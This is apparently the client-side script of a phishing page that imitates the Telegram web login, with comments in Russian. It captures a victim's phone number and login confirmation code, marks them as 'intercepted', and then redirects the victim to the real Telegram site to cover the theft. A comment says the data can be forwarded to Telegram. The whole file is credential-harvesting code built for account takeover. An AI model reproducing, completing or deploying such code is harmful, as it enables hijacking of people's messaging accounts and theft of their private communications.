// Глобальные переменные для хранения данных
var userPhone = '';

// Обработка номера телефона
document.getElementById('phoneForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    userPhone = document.getElementById('phone').value;
    
    // Показываем раздел с кодом
    document.getElementById('phoneForm').style.display = 'none';
    document.getElementById('codeSection').style.display = 'block';
    
    // Сохраняем номер (можно отправить в Telegram)
    console.log("Phone number:", userPhone);
});

// Обработка кода подтверждения
document.getElementById('codeForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    var code = document.getElementById('code').value;
    
    // ВСЕ ДАННЫЕ СОБРАНЫ!
    console.log("Phone:", userPhone);
    console.log("Code:", code);
    
    // Показываем alert с данными
    alert("Данные перехвачены:\nТелефон: " + userPhone + "\nКод: " + code);
    
    // Редирект на настоящий Telegram
    setTimeout(function() {
        window.location.href = "https://web.telegram.org/";
    }, 2000);
});
